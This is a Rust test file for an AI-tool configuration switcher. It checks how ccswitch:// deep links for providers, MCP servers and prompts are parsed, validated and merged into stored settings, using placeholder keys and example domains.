//! Deep link module tests

use super::mcp::parse_mcp_apps;
use super::parser::parse_deeplink_url;
use super::prompt::import_prompt_from_deeplink;
use super::provider::parse_and_merge_config;
use super::utils::{infer_homepage_from_endpoint, validate_url};
use super::DeepLinkImportRequest;
use crate::provider::UsageScript;
use crate::AppType;
use crate::{store::AppState, Database};
use base64::prelude::*;
use std::{env, ffi::OsString, sync::Arc};

struct TestHomeGuard {
    _dir: tempfile::TempDir,
    original_home: Option<OsString>,
    original_userprofile: Option<OsString>,
    original_test_home: Option<OsString>,
}

impl TestHomeGuard {
    fn new() -> Self {
        let dir = tempfile::tempdir().expect("create isolated test home");
        let original_home = env::var_os("HOME");
        let original_userprofile = env::var_os("USERPROFILE");
        let original_test_home = env::var_os("CC_SWITCH_TEST_HOME");

        env::set_var("HOME", dir.path());
        env::set_var("USERPROFILE", dir.path());
        env::set_var("CC_SWITCH_TEST_HOME", dir.path());

        Self {
            _dir: dir,
            original_home,
            original_userprofile,
            original_test_home,
        }
    }
}

impl Drop for TestHomeGuard {
    fn drop(&mut self) {
        match &self.original_test_home {
            Some(value) => env::set_var("CC_SWITCH_TEST_HOME", value),
            None => env::remove_var("CC_SWITCH_TEST_HOME"),
        }
        match &self.original_userprofile {
            Some(value) => env::set_var("USERPROFILE", value),
            None => env::remove_var("USERPROFILE"),
        }
        match &self.original_home {
            Some(value) => env::set_var("HOME", value),
            None => env::remove_var("HOME"),
        }
    }
}

// =============================================================================
// Parser Tests
// =============================================================================

#[test]
fn test_parse_valid_claude_deeplink() {
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test%20Provider&homepage=https%3A%2F%2Fexample.com&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test-123&icon=claude";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.version, "v1");
    assert_eq!(request.resource, "provider");
    assert_eq!(request.app, Some("claude".to_string()));
    assert_eq!(request.name, Some("Test Provider".to_string()));
    assert_eq!(request.homepage, Some("https://example.com".to_string()));
    assert_eq!(
        request.endpoint,
        Some("https://api.example.com".to_string())
    );
    assert_eq!(request.api_key, Some("sk-test-123".to_string()));
    assert_eq!(request.icon, Some("claude".to_string()));
}

#[test]
fn test_parse_deeplink_drops_icon_that_is_not_a_builtin_name() {
    let base = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test";

    // 大小写和空白照旧归一
    let request = parse_deeplink_url(&format!("{base}&icon=%20DeepSeek%20")).unwrap();
    assert_eq!(request.icon, Some("deepseek".to_string()));

    // data URI、外链地址都不是图标名：丢掉，链接本身照常解析
    for icon in [
        "data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgo%3D",
        "https%3A%2F%2Fexample.com%2Flogo.png",
        "%3Csvg%3E",
    ] {
        let request = parse_deeplink_url(&format!("{base}&icon={icon}")).unwrap();
        assert_eq!(request.icon, None, "{icon}");
    }
}

#[test]
fn test_parse_deeplink_keeps_only_allowed_icon_urls() {
    let base = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test&icon=deepseek";

    let request = parse_deeplink_url(&format!(
        "{base}&iconUrl=https%3A%2F%2Fcdn.example.com%2Flogo.svg"
    ))
    .unwrap();
    assert_eq!(
        request.icon_url.as_deref(),
        Some("https://cdn.example.com/logo.svg")
    );
    // 内置图标照常保留，下载失败时用它
    assert_eq!(request.icon.as_deref(), Some("deepseek"));

    // http、IP、内网主机名、带端口：丢掉，链接本身照常解析
    for url in [
        "http%3A%2F%2Fexample.com%2Flogo.png",
        "https%3A%2F%2F127.0.0.1%2Flogo.png",
        "https%3A%2F%2F%5B%3A%3A1%5D%2Flogo.png",
        "https%3A%2F%2Flocalhost%2Flogo.png",
        "https%3A%2F%2Fexample.com%3A8080%2Flogo.png",
        "data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgo%3D",
    ] {
        let request = parse_deeplink_url(&format!("{base}&iconUrl={url}")).unwrap();
        assert_eq!(request.icon_url, None, "{url}");
    }
}

#[test]
fn test_parse_deeplink_with_notes() {
    let url = "ccswitch://v1/import?resource=provider&app=codex&name=Codex&homepage=https%3A%2F%2Fcodex.com&endpoint=https%3A%2F%2Fapi.codex.com&apiKey=key123&notes=Test%20notes";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.notes, Some("Test notes".to_string()));
}

#[test]
fn pi_provider_link_without_a_model_is_rejected_up_front() {
    let url = "ccswitch://v1/import?resource=provider&app=pi&name=Pi&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test";
    let err = parse_deeplink_url(url).expect_err("a Pi node without models is unusable");
    assert!(err.to_string().contains("model"), "{err}");
}

#[test]
fn test_parse_grokbuild_provider() {
    use super::provider::build_provider_from_request;

    let url = "ccswitch://v1/import?resource=provider&app=grokbuild&name=Grok%20Relay&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=secret&model=grok-4.5";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.app.as_deref(), Some("grokbuild"));
    assert_eq!(request.name.as_deref(), Some("Grok Relay"));
    assert_eq!(
        request.endpoint.as_deref(),
        Some("https://api.example.com/v1")
    );
    assert_eq!(request.api_key.as_deref(), Some("secret"));
    assert_eq!(request.model.as_deref(), Some("grok-4.5"));

    let provider = build_provider_from_request(&AppType::GrokBuild, &request).unwrap();
    let config = provider.settings_config["config"].as_str().unwrap();
    let document = config.parse::<toml::Value>().unwrap();
    let model = &document["model"]["grok-4.5"];

    assert_eq!(document["models"]["default"].as_str(), Some("grok-4.5"));
    assert_eq!(
        model["base_url"].as_str(),
        Some("https://api.example.com/v1")
    );
    assert_eq!(model["name"].as_str(), Some("Grok Relay"));
    assert_eq!(model["api_key"].as_str(), Some("secret"));
    assert_eq!(model["api_backend"].as_str(), Some("responses"));
    assert_eq!(model["context_window"].as_integer(), Some(500_000));
}

#[test]
fn test_parse_invalid_scheme() {
    let url = "https://v1/import?resource=provider&app=claude&name=Test";

    let result = parse_deeplink_url(url);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("Invalid scheme"));
}

#[test]
fn test_parse_unsupported_version() {
    let url = "ccswitch://v2/import?resource=provider&app=claude&name=Test";

    let result = parse_deeplink_url(url);
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Unsupported protocol version"));
}

#[test]
fn test_parse_missing_required_field() {
    // Name is still required even in v3.8+ (only homepage/endpoint/apiKey are optional)
    let url = "ccswitch://v1/import?resource=provider&app=claude";

    let result = parse_deeplink_url(url);
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Missing 'name' parameter"));
}

/// configUrl 没实现，必须在解析阶段就报错：放行的话，用户点了确认导入才失败
#[test]
fn test_parse_rejects_config_url_up_front() {
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&configUrl=https%3A%2F%2Fexample.com%2Fc.json";

    let err = parse_deeplink_url(url).unwrap_err();
    assert!(err.to_string().contains("configUrl"), "{err}");
}

/// 下游 parse_mcp_apps 与 McpService 都支持 Pi / MiniMax Code / Oh My Pi，解析层不能先把它们拦掉
#[test]
fn test_parse_mcp_deeplink_accepts_pi_mcode_and_omp() {
    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fetch":{"command":"uvx"}}}"#);
    let url = format!("ccswitch://v1/import?resource=mcp&apps=claude,pi,mcode,omp&config={config}");

    let request = parse_deeplink_url(&url).expect("pi, mcode and ohmpi are valid MCP targets");
    let apps = parse_mcp_apps(request.apps.as_deref().unwrap()).unwrap();
    assert!(apps.claude && apps.pi && apps.mcode && apps.omp);
}

/// DeepSeek Harness 的 MCP 链接写进 DSH 的标记（Web 与 Desktop 共用）
#[test]
fn test_parse_mcp_deeplink_accepts_dsh() {
    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fetch":{"command":"uvx"}}}"#);
    for apps in ["dsh", "claude,dsh"] {
        let url = format!("ccswitch://v1/import?resource=mcp&apps={apps}&config={config}");
        let request = parse_deeplink_url(&url).expect("dsh is a valid MCP target");
        assert!(
            parse_mcp_apps(request.apps.as_deref().unwrap())
                .unwrap()
                .dsh
        );
    }
}

/// 供应商链接对 Oh My Pi 明确拒绝，而不是落到「Invalid provider app type」。
#[test]
fn test_parse_provider_deeplink_refuses_omp_with_guidance() {
    for app in ["omp", "ohmypi", "oh-my-pi", "oh_my_pi"] {
        let url =
            format!("ccswitch://v1/import?resource=provider&app={app}&name=Test&endpoint=https%3A%2F%2Fapi.example.com");
        let err = parse_deeplink_url(&url).unwrap_err().to_string();
        assert!(
            err.contains("Oh My Pi provider page"),
            "{app} should be sent to the Oh My Pi page, got: {err}"
        );
    }
}

#[test]
fn test_parse_prompt_deeplink_accepts_mcode() {
    let url = "ccswitch://v1/import?resource=prompt&app=mcode&name=Rules&content=IyBoaQ%3D%3D";

    let request = parse_deeplink_url(url).expect("MiniMax Code has a prompt panel");
    assert_eq!(request.app.as_deref(), Some("mcode"));
}

/// 读取不清除，按编号确认才清除：前端读到后、显示前被打断（effect 重建、窗口销毁），
/// 下次读取仍能拿到；期间来了新链接，迟到的旧确认不能把新链接清掉
#[test]
#[serial_test::serial]
fn test_pending_deeplink_survives_peek_and_clears_only_on_matching_ack() {
    use super::{
        ack_pending_deeplink, peek_pending_deeplink, set_pending_deeplink, PendingDeepLink,
    };

    let link = |name: &str| PendingDeepLink::Import {
        request: Box::new(
            parse_deeplink_url(&format!(
                "ccswitch://v1/import?resource=provider&app=claude&name={name}"
            ))
            .expect("valid link"),
        ),
    };

    set_pending_deeplink(link("A"));
    let first = peek_pending_deeplink().expect("pending link");
    let json = serde_json::to_value(&first).unwrap();
    assert_eq!(json["link"]["kind"], "import");
    assert_eq!(json["link"]["request"]["name"], "A");
    assert_eq!(
        peek_pending_deeplink().map(|entry| entry.id),
        Some(first.id),
        "peek must not clear the link"
    );

    set_pending_deeplink(link("B"));
    ack_pending_deeplink(first.id);
    let second = peek_pending_deeplink().expect("a stale ack must not clear the newer link");
    assert_ne!(second.id, first.id);

    ack_pending_deeplink(second.id);
    assert!(peek_pending_deeplink().is_none());
}

// =============================================================================
// Utils Tests
// =============================================================================

#[test]
fn test_validate_invalid_url() {
    let result = validate_url("not-a-url", "test");
    assert!(result.is_err());
}

#[test]
fn test_validate_invalid_scheme() {
    let result = validate_url("ftp://example.com", "test");
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("must be http or https"));
}

#[test]
fn test_infer_homepage() {
    assert_eq!(
        infer_homepage_from_endpoint("https://api.anthropic.com/v1"),
        Some("https://anthropic.com".to_string())
    );
    assert_eq!(
        infer_homepage_from_endpoint("https://api-test.company.com/v1"),
        Some("https://test.company.com".to_string())
    );
    assert_eq!(
        infer_homepage_from_endpoint("https://example.com"),
        Some("https://example.com".to_string())
    );
}

// =============================================================================
// Provider Tests
// =============================================================================

#[test]
fn test_build_gemini_provider_with_model() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("gemini".to_string()),
        name: Some("Test Gemini".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("test-api-key".to_string()),
        icon: None,
        model: Some("gemini-2.0-flash".to_string()),
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: None,
        config_format: None,
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();

    // Verify provider basic info
    assert_eq!(provider.name, "Test Gemini");
    assert_eq!(
        provider.website_url,
        Some("https://example.com".to_string())
    );

    // Verify settings_config structure
    let env = provider.settings_config["env"].as_object().unwrap();
    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
    assert_eq!(env["GEMINI_MODEL"], "gemini-2.0-flash");
}

#[test]
fn test_build_gemini_provider_without_model() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("gemini".to_string()),
        name: Some("Test Gemini".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("test-api-key".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: None,
        config_format: None,
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();

    let env = provider.settings_config["env"].as_object().unwrap();
    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
    // Model should not be present
    assert!(env.get("GEMINI_MODEL").is_none());
}

#[test]
fn test_deeplink_usage_script_does_not_copy_provider_credentials() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1/".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: None,
        config_format: None,
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: Some(true),
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert!(script.enabled);
    assert_eq!(script.api_key, None);
    assert_eq!(script.base_url, None);
}

/// 构造一个只带用量脚本字段的 provider 请求，其余保持最小。
fn usage_script_request(code: &str, usage_enabled: Option<bool>) -> DeepLinkImportRequest {
    DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1/".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: None,
        config_format: None,
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled,
        usage_script: Some(BASE64_STANDARD.encode(code)),
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    }
}

#[test]
fn test_deeplink_usage_script_is_enabled_by_default_when_the_link_carries_code() {
    use super::provider::build_provider_from_request;

    // 站长放脚本就是为了让用户看到余额；链接没写 usageEnabled 时，带了脚本即启用。
    // 前端确认框的「已启用」徽章按同一规则显示。
    let code = "export async function query() { return { cost: 0 }; }";
    let request = usage_script_request(code, None);

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert!(script.enabled, "带了脚本、没写 usageEnabled 时应默认启用");
    assert_eq!(script.code, code);
}

#[test]
fn test_deeplink_usage_script_stays_disabled_when_the_link_opts_out() {
    use super::provider::build_provider_from_request;

    let code = "export async function query() { return { cost: 0 }; }";
    let request = usage_script_request(code, Some(false));

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should still be created");

    assert!(!script.enabled, "usageEnabled=false 必须照办");
    // 代码仍要保留：用户之后可在应用内手动开启。
    assert_eq!(script.code, code);
}

#[test]
fn test_deeplink_usage_fields_without_a_script_are_not_enabled_by_default() {
    use super::provider::build_provider_from_request;

    // 没有脚本就没有东西可跑：只带凭据类字段的链接不应默认启用。
    let mut request = usage_script_request("", None);
    request.usage_script = None;
    request.usage_access_token = Some("token".to_string());

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage fields should still be stored");

    assert!(!script.enabled);
}

#[test]
fn test_deeplink_usage_script_honors_an_explicit_enable_request_from_the_link() {
    use super::provider::build_provider_from_request;

    // `usageEnabled=true` 是**链接作者**的请求，不是用户的选择——用户的同意体现在
    // 看过确认框里完整的脚本正文与启用状态之后点了导入。
    let code = "export async function query() { return { cost: 0 }; }";
    let request = usage_script_request(code, Some(true));

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert!(script.enabled);
    assert_eq!(script.code, code);
}

#[test]
fn test_deeplink_usage_script_omits_explicit_credentials_that_match_provider() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1/".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: None,
        config_format: None,
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: Some(true),
        usage_script: None,
        usage_api_key: Some(" sk-main ".to_string()),
        usage_base_url: Some(" https://api.example.com/v1/ ".to_string()),
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert_eq!(script.api_key, None);
    assert_eq!(script.base_url, None);
}

#[test]
fn test_deeplink_usage_script_preserves_distinct_usage_credentials() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: None,
        config_format: None,
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: Some(true),
        usage_script: None,
        usage_api_key: Some(" sk-usage ".to_string()),
        usage_base_url: Some(" https://usage.example/api/ ".to_string()),
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert_eq!(script.api_key.as_deref(), Some("sk-usage"));
    assert_eq!(
        script.base_url.as_deref(),
        Some("https://usage.example/api")
    );
}

#[test]
fn test_parse_and_merge_config_claude() {
    // Prepare Base64 encoded Claude config
    let config_json = r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1","ANTHROPIC_MODEL":"claude-sonnet-4.5"}}"#;
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test".to_string()),
        homepage: None,
        endpoint: None,
        api_key: None,
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let merged = parse_and_merge_config(&request).unwrap();

    // Should auto-fill from config
    assert_eq!(merged.api_key, Some("sk-ant-xxx".to_string()));
    assert_eq!(
        merged.endpoint,
        Some("https://api.anthropic.com/v1".to_string())
    );
    assert_eq!(merged.homepage, Some("https://anthropic.com".to_string()));
    assert_eq!(merged.model, Some("claude-sonnet-4.5".to_string()));
}

#[test]
fn test_parse_and_merge_config_codex_uses_bearer_token() {
    let config_toml = r#"model_provider = "rightcode"
model = "gpt-5-codex"

[model_providers.rightcode]
base_url = "https://rightcode.example/v1"
wire_api = "responses"
experimental_bearer_token = "sk-rightcode"
"#;
    let config_json = serde_json::json!({
        "auth": {},
        "config": config_toml,
    })
    .to_string();
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("codex".to_string()),
        name: Some("RightCode".to_string()),
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        ..Default::default()
    };

    let merged = parse_and_merge_config(&request).unwrap();

    assert_eq!(merged.api_key, Some("sk-rightcode".to_string()));
    assert_eq!(
        merged.endpoint,
        Some("https://rightcode.example/v1".to_string())
    );
    assert_eq!(
        merged.homepage,
        Some("https://rightcode.example".to_string())
    );
    assert_eq!(merged.model, Some("gpt-5-codex".to_string()));
}

#[test]
fn test_parse_and_merge_config_grokbuild() {
    let config_toml = r#"[models]
default = "grok-profile"

[model."grok-profile"]
model = "grok-upstream"
base_url = "https://grok.example/v1"
name = "Grok Relay"
api_key = "sk-grok"
api_backend = "responses"
context_window = 500000
"#;
    let config_json = serde_json::json!({ "config": config_toml }).to_string();
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("grokbuild".to_string()),
        name: Some("Grok Relay".to_string()),
        config: Some(BASE64_STANDARD.encode(config_json.as_bytes())),
        config_format: Some("json".to_string()),
        ..Default::default()
    };

    let merged = parse_and_merge_config(&request).expect("merge Grok Build config");

    assert_eq!(merged.api_key.as_deref(), Some("sk-grok"));
    assert_eq!(merged.endpoint.as_deref(), Some("https://grok.example/v1"));
    assert_eq!(merged.model.as_deref(), Some("grok-upstream"));
    assert_eq!(merged.homepage.as_deref(), Some("https://grok.example"));
}

#[test]
fn test_parse_and_merge_config_url_override() {
    let config_json = r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-old","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1"}}"#;
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test".to_string()),
        homepage: None,
        endpoint: None,
        api_key: Some("sk-new".to_string()), // URL param should override
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let merged = parse_and_merge_config(&request).unwrap();

    // URL param should take priority
    assert_eq!(merged.api_key, Some("sk-new".to_string()));
    // Config file value should be used
    assert_eq!(
        merged.endpoint,
        Some("https://api.anthropic.com/v1".to_string())
    );
}

#[test]
fn test_build_claude_provider_preserves_custom_env_fields() {
    // Regression test for: deeplink import dropped non-standard env fields
    // such as ANTHROPIC_CUSTOM_HEADERS, even though the preview dialog
    // showed them. The preview and the actual persisted provider must
    // contain the same env keys.
    use super::provider::build_provider_from_request;

    let config_json = r#"{"env":{
        "ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx",
        "ANTHROPIC_BASE_URL":"https://api.example.com",
        "ANTHROPIC_CUSTOM_HEADERS":"Cookie: session=abc",
        "API_TIMEOUT_MS":"3000000",
        "CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS":"1",
        "ANTHROPIC_DEFAULT_HAIKU_MODEL":"haiku-from-config"
    }}"#;
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("My Provider".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("sk-ant-xxx".to_string()),
        icon: None,
        // URL param: must win over the same key in config (haiku-from-config)
        model: Some("main-model".to_string()),
        notes: None,
        haiku_model: Some("haiku-from-url".to_string()),
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let env = provider.settings_config["env"].as_object().unwrap();

    // Custom env fields from `config` must survive import
    assert_eq!(env["ANTHROPIC_CUSTOM_HEADERS"], "Cookie: session=abc");
    assert_eq!(env["API_TIMEOUT_MS"], "3000000");
    assert_eq!(env["CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS"], "1");

    // Standard fields from URL params win over config
    assert_eq!(env["ANTHROPIC_AUTH_TOKEN"], "sk-ant-xxx");
    assert_eq!(env["ANTHROPIC_BASE_URL"], "https://api.example.com");
    assert_eq!(env["ANTHROPIC_MODEL"], "main-model");
    assert_eq!(env["ANTHROPIC_DEFAULT_HAIKU_MODEL"], "haiku-from-url");
}

#[test]
fn test_build_claude_provider_without_config_unchanged() {
    // Backward compatibility: deeplinks without a `config` field still
    // produce exactly the same env shape as before — only the standard
    // ANTHROPIC_* keys, nothing else.
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Plain".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("sk".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        api_format: None,
        config: None,
        config_format: None,
        config_url: None,
        icon_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let env = provider.settings_config["env"].as_object().unwrap();

    assert_eq!(env["ANTHROPIC_AUTH_TOKEN"], "sk");
    assert_eq!(env["ANTHROPIC_BASE_URL"], "https://api.example.com");
    // No extras leaked in
    assert_eq!(env.len(), 2);
}

// =============================================================================
// Prompt Tests
// =============================================================================

// Integration-style unit test: prompt import reaches PromptService and resolves
// live config file paths, so HOME must be isolated before it runs.
#[test]
#[serial_test::serial]
fn test_import_prompt_allows_space_in_base64_content() {
    let _test_home = TestHomeGuard::new();
    let url = "ccswitch://v1/import?resource=prompt&app=codex&name=PromptPlus&content=Pj4+";
    let request = parse_deeplink_url(url).unwrap();

    // URL decoded content may have "+" become space
    assert_eq!(request.content.as_deref(), Some("Pj4 "));

    let db = Arc::new(Database::memory().expect("create memory db"));
    let state = AppState::new(db.clone());

    let prompt_id = import_prompt_from_deeplink(&state, request.clone()).expect("import prompt");

    let prompts = state.db.get_prompts("codex").expect("get prompts");
    let prompt = prompts.get(&prompt_id).expect("prompt saved");

    assert_eq!(prompt.content, ">>>");
    assert_eq!(prompt.name, request.name.unwrap());
}

// =============================================================================
// MCP Tests
// =============================================================================

#[test]
fn test_parse_mcp_apps() {
    let apps = parse_mcp_apps("claude,codex").unwrap();
    assert!(apps.claude);
    assert!(apps.codex);
    assert!(!apps.gemini);

    let apps = parse_mcp_apps("gemini").unwrap();
    assert!(!apps.claude);
    assert!(!apps.codex);
    assert!(apps.gemini);

    let apps = parse_mcp_apps("grokbuild,opencode,hermes").unwrap();
    assert!(apps.grokbuild);
    assert!(apps.opencode);
    assert!(apps.hermes);

    let err = parse_mcp_apps("invalid").unwrap_err();
    assert!(err.to_string().contains("Invalid app"));
}

#[test]
fn test_parse_prompt_deeplink() {
    let content = "Hello World";
    let content_b64 = BASE64_STANDARD.encode(content);
    let url = format!(
        "ccswitch://v1/import?resource=prompt&app=claude&name=test&content={}&description=desc&enabled=true",
